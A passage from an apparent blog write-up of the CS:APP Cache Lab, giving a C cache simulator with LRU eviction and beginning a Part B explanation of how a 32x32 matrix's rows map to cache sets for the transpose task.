class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;getopt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">"cachelab.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Should avoid global variables. For simplicity here.</span></span><br><span class="line"><span class="type">int</span> hit_count = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> miss_count = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> eviction_count = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> verbose = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> help_msgs = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> t = <span class="number">0</span>, s = <span class="number">0</span>, set_num = <span class="number">0</span>, E = <span class="number">0</span>, b = <span class="number">0</span>, block_size = <span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> offset_mask = <span class="number">0</span>, set_mask = <span class="number">0</span>, check_mask = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">lru_node</span> <span class="type">lru_node_t</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">lru_node</span> {</span><br><span class="line">    <span class="type">int</span> line_number;</span><br><span class="line">    <span class="type">lru_node_t</span>* next;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">cache_line</span> {</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> check_bits;</span><br><span class="line">    <span class="type">char</span>* p_block;</span><br><span class="line">    <span class="type">bool</span> valid;</span><br><span class="line">} <span class="type">cache_line_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">operation_line</span> {</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> address;</span><br><span class="line">    <span class="type">int</span> data_size;</span><br><span class="line">    <span class="type">char</span> op;</span><br><span class="line">} <span class="type">operation_line_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print_help_msgs</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Usage: ./csim [hv] -s &lt;num&gt; -E &lt;num&gt; -b &lt;num&gt; -t &lt;file&gt;\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Options:\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"  -h         Print this help message.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"  -v         Optional verbose flag.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"  -s &lt;num&gt;   Number of set index bits.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"  -E &lt;num&gt;   Number of lines per set.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"  -b &lt;num&gt;   Number of block offset bits.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"  -t &lt;file&gt;  Trace file.\n\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Examples:\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"  linux&gt;  ./csim -s 4 -E 1 -b 4 -t traces/yi.trace\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"  linux&gt;  ./csim -v -s 8 -E 2 -b 4 -t traces/yi.trace\n"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">operation_line_t</span> <span class="title">parse_line</span><span class="params">(<span class="type">char</span>* line)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="type">operation_line_t</span> operation_line;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> start_index, end_index;</span><br><span class="line">    <span class="type">char</span> str_address[<span class="number">128</span>];</span><br><span class="line">    <span class="type">char</span> str_size[<span class="number">16</span>];</span><br><span class="line">    <span class="type">char</span>* end = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(line[<span class="number">0</span>] == <span class="string">'I'</span>) </span><br><span class="line">    {</span><br><span class="line">        operation_line.op = <span class="string">'I'</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">        operation_line.op = line[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">        start_index = end_index = <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">while</span> (line[end_index] != <span class="string">','</span>) </span><br><span class="line">        {</span><br><span class="line">            ++end_index;</span><br><span class="line">        }</span><br><span class="line">        <span class="built_in">strncpy</span>(str_address, line + start_index, end_index - start_index);</span><br><span class="line">        str_address[end_index - start_index] = <span class="string">'\0'</span>;</span><br><span class="line">        operation_line.address = <span class="built_in">strtoul</span>(str_address, &amp;end, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">        start_index = end_index + <span class="number">1</span>;</span><br><span class="line">        end_index = start_index + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="built_in">isdigit</span>(line[end_index])) </span><br><span class="line">        {</span><br><span class="line">            ++end_index;</span><br><span class="line">        }</span><br><span class="line">        <span class="built_in">strncpy</span>(str_size, line + start_index, end_index - start_index);</span><br><span class="line">        str_size[end_index - start_index] = <span class="string">'\0'</span>;</span><br><span class="line">        operation_line.data_size = <span class="built_in">atoi</span>(str_size);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> operation_line;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find_lru_index</span><span class="params">(<span class="type">lru_node_t</span>* root)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">while</span> (root-&gt;next != <span class="literal">NULL</span>)</span><br><span class="line">    {</span><br><span class="line">        root = root-&gt;next;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> root-&gt;line_number;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">lru_node_t</span>* <span class="title">create_node</span><span class="params">(<span class="type">lru_node_t</span>* root, <span class="type">int</span> used_index)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="type">lru_node_t</span>* new_node = <span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(<span class="type">lru_node_t</span>));</span><br><span class="line">    new_node-&gt;line_number = used_index;</span><br><span class="line">    new_node-&gt;next = root-&gt;next;</span><br><span class="line">    root-&gt;next = new_node;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> new_node;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">lru_node_t</span>* <span class="title">find_node_with_index</span><span class="params">(<span class="type">lru_node_t</span>* root, <span class="type">int</span> used_index, <span class="type">lru_node_t</span>** prev_node)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="comment">// Start with the real rool node</span></span><br><span class="line">    root = root-&gt;next;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (root != <span class="literal">NULL</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;line_number == used_index)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        {</span><br><span class="line">            *prev_node = root;</span><br><span class="line">            root = root-&gt;next;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">update_lru_node</span><span class="params">(<span class="type">lru_node_t</span>* root, <span class="type">int</span> used_index)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="literal">NULL</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">create_node</span>(root, used_index);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 1). Don't forget to set the previous node's next</span></span><br><span class="line">    <span class="type">lru_node_t</span>* prev_node = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">lru_node_t</span>* found_node = <span class="built_in">find_node_with_index</span>(root, used_index, &amp;prev_node);</span><br><span class="line">    <span class="keyword">if</span> (found_node != <span class="literal">NULL</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span> (prev_node != <span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            prev_node-&gt;next = found_node-&gt;next;</span><br><span class="line">        }</span><br><span class="line">        <span class="comment">// 2). Be careful when root's next is the found node</span></span><br><span class="line">        found_node-&gt;next = (root-&gt;next == found_node ? found_node-&gt;next : root-&gt;next);</span><br><span class="line">        root-&gt;next = found_node;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">create_node</span>(root, used_index);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">cache_operation</span><span class="params">(<span class="type">operation_line_t</span>* operation, <span class="type">char</span>* line, <span class="type">cache_line_t</span>** cache_decay, <span class="type">lru_node_t</span>* lru_roots)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    line[<span class="built_in">strlen</span>(line) - <span class="number">1</span>] = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> op = operation-&gt;op;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> address = operation-&gt;address;</span><br><span class="line">    <span class="type">int</span> set = (address &amp; set_mask) &gt;&gt; b;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> check = ((address &amp; check_mask) &gt;&gt; (s + b)) &amp; ((<span class="number">1</span> &lt;&lt; (s + b)) - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cache_line_t</span> (*cache)[E] = (<span class="built_in">cache_line_t</span>(*)[E]) cache_decay;</span><br><span class="line">    <span class="type">cache_line_t</span>* cache_set = cache[set];</span><br><span class="line"></span><br><span class="line">    <span class="type">bool</span> b_hit = <span class="literal">false</span>;</span><br><span class="line">    <span class="type">int</span> placement_or_hit_index = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; E; ++i)</span><br><span class="line">    {</span><br><span class="line">        <span class="comment">// Cache hit</span></span><br><span class="line">        <span class="keyword">if</span> (cache_set[i].valid &amp;&amp; cache_set[i].check_bits == check)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">if</span> (op == <span class="string">'M'</span>)</span><br><span class="line">            {</span><br><span class="line">                <span class="keyword">if</span> (verbose) {</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"%s hit hit\n"</span>, line);</span><br><span class="line">                }</span><br><span class="line">                hit_count += <span class="number">2</span>;</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">            {</span><br><span class="line">                <span class="keyword">if</span> (verbose) {</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"%s hit\n"</span>, line);</span><br><span class="line">                }</span><br><span class="line">                ++hit_count;</span><br><span class="line">            }</span><br><span class="line">            </span><br><span class="line">            placement_or_hit_index = i;</span><br><span class="line">            b_hit = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="comment">// Empty line</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (!cache_set[i].valid)</span><br><span class="line">        {</span><br><span class="line">            placement_or_hit_index = i;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Cache miss, do placement or eviction</span></span><br><span class="line">    <span class="keyword">if</span> (!b_hit)</span><br><span class="line">    {</span><br><span class="line">        <span class="comment">// Has empty line, do placement</span></span><br><span class="line">        <span class="keyword">if</span> (placement_or_hit_index != <span class="number">-1</span>)</span><br><span class="line">        {</span><br><span class="line">            cache_set[placement_or_hit_index].valid = <span class="literal">true</span>;</span><br><span class="line">            cache_set[placement_or_hit_index].check_bits = check;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (op == <span class="string">'M'</span>)</span><br><span class="line">            {</span><br><span class="line">                <span class="keyword">if</span> (verbose) {</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"%s miss hit\n"</span>, line);</span><br><span class="line">                }</span><br><span class="line">                ++miss_count;</span><br><span class="line">                ++hit_count;</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            {</span><br><span class="line">                <span class="keyword">if</span> (verbose) {</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"%s miss\n"</span>, line);</span><br><span class="line">                }</span><br><span class="line">                ++miss_count;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="comment">// All lines are occupied, do eviction</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        {</span><br><span class="line">            placement_or_hit_index = <span class="built_in">find_lru_index</span>(&amp;lru_roots[set]);</span><br><span class="line">            cache_set[placement_or_hit_index].check_bits = check;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (op == <span class="string">'M'</span>)</span><br><span class="line">            {</span><br><span class="line">                <span class="keyword">if</span> (verbose) {</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"%s miss eviction hit\n"</span>, line);</span><br><span class="line">                }</span><br><span class="line">                ++miss_count;</span><br><span class="line">                ++eviction_count;</span><br><span class="line">                ++hit_count;</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            {</span><br><span class="line">                <span class="keyword">if</span> (verbose) {</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"%s miss eviction\n"</span>, line);</span><br><span class="line">                }</span><br><span class="line">                ++miss_count;</span><br><span class="line">                ++eviction_count;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">update_lru_node</span>(&amp;lru_roots[set], placement_or_hit_index);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="comment">// Parse input arguments</span></span><br><span class="line">    <span class="type">int</span> opt;</span><br><span class="line">    <span class="type">char</span>* trace_file;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ((opt = <span class="built_in">getopt</span>(argc, argv, <span class="string">"hvs:E:b:t:"</span>)) != <span class="number">-1</span>) {</span><br><span class="line">        <span class="keyword">switch</span> (opt) {</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'h'</span>: </span><br><span class="line">                help_msgs = <span class="number">1</span>; </span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'v'</span>: </span><br><span class="line">                verbose = <span class="number">1</span>; </span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'s'</span>:</span><br><span class="line">                s = <span class="built_in">atoi</span>(optarg);</span><br><span class="line">                set_num = <span class="number">1</span> &lt;&lt; s;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'E'</span>:</span><br><span class="line">                E = <span class="built_in">atoi</span>(optarg);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'b'</span>:</span><br><span class="line">                b = <span class="built_in">atoi</span>(optarg);</span><br><span class="line">                block_size = <span class="number">1</span> &lt;&lt; b;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'t'</span>:</span><br><span class="line">                trace_file = optarg;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Invalid arguments!"</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (help_msgs)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">print_help_msgs</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (s &lt;= <span class="number">0</span> || E &lt;= <span class="number">0</span> || b &lt;= <span class="number">0</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Invalid argument values!\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Compute other global variables</span></span><br><span class="line">    t = <span class="number">64</span> - s - b;</span><br><span class="line">    offset_mask = (<span class="number">1</span> &lt;&lt; b) - <span class="number">1</span>;</span><br><span class="line">    set_mask = (<span class="number">1</span> &lt;&lt; (s + b)) - <span class="number">1</span> - offset_mask;</span><br><span class="line">    check_mask = -(<span class="number">1</span> &lt;&lt; (s + b));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Allocate memory for cache</span></span><br><span class="line">    <span class="type">lru_node_t</span>* lru_roots = <span class="built_in">calloc</span>(set_num, <span class="built_in">sizeof</span>(<span class="type">lru_node_t</span>));</span><br><span class="line">    <span class="built_in">cache_line_t</span> (*cache)[E] = <span class="built_in">calloc</span>(set_num, <span class="built_in">sizeof</span>(<span class="type">cache_line_t</span>) * E);</span><br><span class="line">    <span class="type">char</span>* p_cache_space = <span class="built_in">malloc</span>(block_size * set_num * E);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; set_num; ++i)</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; E; ++j)</span><br><span class="line">        {</span><br><span class="line">            cache[i][j].p_block = p_cache_space + i * (block_size * E) + j * block_size;</span><br><span class="line">        }</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Read file and process by line</span></span><br><span class="line">    FILE* file = <span class="built_in">fopen</span>(trace_file, <span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">NULL</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Cannot open file %s\n"</span>, trace_file);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="type">char</span> line[<span class="number">128</span>];</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">fgets</span>(line, <span class="number">128</span>, file))</span><br><span class="line">    {</span><br><span class="line">        <span class="type">operation_line_t</span> operation = <span class="built_in">parse_line</span>(line);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">switch</span> (operation.op)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'L'</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'S'</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'M'</span>:</span><br><span class="line">                <span class="built_in">cache_operation</span>(&amp;operation, line, (<span class="type">cache_line_t</span>**)cache, lru_roots);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Print summary and clean up memory</span></span><br><span class="line">    <span class="built_in">printSummary</span>(hit_count, miss_count, eviction_count);</span><br><span class="line">    <span class="built_in">free</span>(cache);</span><br><span class="line">    <span class="built_in">free</span>(p_cache_space);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>One thing you should be very careful about is when we update the LRU
linked list. By the way, I was wondering if there is a simpler method to
implement LRU? Linked list seems to result in memory and time
overhead.</p>
<p><strong>Part B</strong></p>
<p>This the the hardest one so far! But take it easy and think about it
step by step.</p>
<p>For a given 32*32 matrix, each row of it has four sequential blocks
in cache because each cache block contains 8 integers (32 bytes) and
each row of the matrix has 4 sets of 8 integers. The cache layout for
the matrix is shown as below:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"> -------------------</span><br><span class="line">| 0  | 1  | 2  | 3  |  row 1</span><br><span class="line"> -------------------</span><br><span class="line">| 4  | 5  | 6  | 7  |  row 2</span><br><span class="line"> -------------------</span><br><span class="line">| 8  | 9  | 10 | 11 |  row 3</span><br><span class="line"> -------------------</span><br><span class="line">| 12 | 13 | 14 | 15 |  row 4</span><br><span class="line"> -------------------</span><br><span class="line">| 16 | 17 | 18 | 19 |  row 5</span><br><span class="line"> -------------------</span><br><span class="line">| 20 | 21 | 22 | 23 |  row 6</span><br><span class="line"> -------------------</span><br><span class="line">| 24 | 25 | 26 | 27 |  row 7</span><br><span class="line"> -------------------</span><br><span class="line">| 28 | 29 | 30 | 31 |  row 8</span><br><span class="line"> -------------------</span><br><span class="line">| 0  | 1  | 2  | 3  |  row 9</span><br><span class="line"> -------------------</span><br><span class="line">| 4  | 5  | 6  | 7  |  row 10</span><br><span class="line"> -------------------</span><br><span class="line">| 8  | 9  | 10 | 11 |  row 11</span><br><span class="line"> -------------------</span><br><span class="line">| 12 | 13 | 14 | 15 |  row 12</span><br><span class="line"> -------------------</span><br><span class="line">| 16 | 17 | 18 | 19 |  row 13</span><br><span class="line"> -------------------</span><br><span class="line">| 20 | 21 | 22 | 23 |  row 14</span><br><span class="line"> -------------------</span><br><span class="line">| 24 | 25 | 26 | 27 |  row 15</span><br><span class="line"> -------------------</span><br><span class="line">| 28 | 29 | 30 | 31 |  row 16</span><br><span class="line"> -------------------</span><br><span class="line">| 0  | 1  | 2  | 3  |  row 17</span><br><span class="line"> -------------------</span><br><span class="line">| 4  | 5  | 6  | 7  |  row 18</span><br><span class="line"> -------------------</span><br><span class="line">| 8  | 9  | 10 | 11 |  row 19</span><br><span class="line"> -------------------</span><br><span class="line">| 12 | 13 | 14 | 15 |  row 20</span><br><span class="line"> -------------------</span><br><span class="line">| 16 | 17 | 18 | 19 |  row 21</span><br><span class="line"> -------------------</span><br><span class="line">| 20 | 21 | 22 | 23 |  row 22</span><br><span class="line"> -------------------</span><br><span class="line">| 24 | 25 | 26 | 27 |  row 23</span><br><span class="line"> -------------------</span><br><span class="line">| 28 | 29 | 30 | 31 |  row 24</span><br><span class="line"> -------------------</span><br><span class="line">| 0  | 1  | 2  | 3  |  row 25</span><br><span class="line"> -------------------</span><br><span class="line">| 4  | 5  | 6  | 7  |  row 26</span><br><span class="line"> -------------------</span><br><span class="line">| 8  | 9  | 10 | 11 |  row 27</span><br><span class="line"> -------------------</span><br><span class="line">| 12 | 13 | 14 | 15 |  row 28</span><br><span class="line"> -------------------</span><br><span class="line">| 16 | 17 | 18 | 19 |  row 29</span><br><span class="line"> -------------------</span><br><span class="line">| 20 | 21 | 22 | 23 |  row 30</span><br><span 